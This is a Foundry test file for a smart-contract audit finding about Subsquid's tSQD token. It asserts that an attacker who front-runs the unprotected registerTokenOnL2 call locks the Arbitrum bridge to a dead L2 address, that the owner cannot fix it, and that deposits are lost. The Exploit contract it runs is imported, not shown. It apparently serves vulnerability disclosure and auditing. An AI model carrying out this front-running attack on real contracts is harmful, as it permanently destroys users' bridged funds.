// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.27;

import "forge-std/Test.sol";
import {Exploit, tSQD, L1CustomGateway, L1GatewayRouter, BridgeUser} from
    "./58248-h-04-lack-of-access-control-on-tsqds-registertokenonl2-pasho.sol";

// Subsquid H-04 (finding 58248): tSQD.registerTokenOnL2 has no access control,
// so an unprivileged attacker front-runs and registers a WRONG/dead L2 token
// address. Arbitrum's gateway locks the L1->L2 mapping permanently, so the owner
// can never fix it and all future bridge deposits are routed to the dead address
// and lost.
contract Finding58248Test is Test {
    function test_exploit_registerTokenOnL2_bricksBridge() public {
        Exploit e = new Exploit();
        e.run();

        emit log_named_address("registered L2 (attacker-set, wrong)", e.registeredL2());
        emit log_named_uint("owner fix reverted (1=yes)", e.ownerFixReverted() ? 1 : 0);
        emit log_named_uint("bridged value stuck at wrong dest", e.stuckAtSink());

        // attacker locked the bridge to the wrong (dead) address
        assertEq(e.registeredL2(), address(0xD00d), "bridge not locked to attacker's wrong L2 address");
        // owner could not repoint to the correct address
        assertTrue(e.ownerFixReverted(), "owner was able to fix the registration");
        // an honest user's 1000 tSQD bridge deposit is permanently lost
        assertEq(e.stuckAtSink(), 1000 ether, "bridged value not permanently stuck");
    }
}
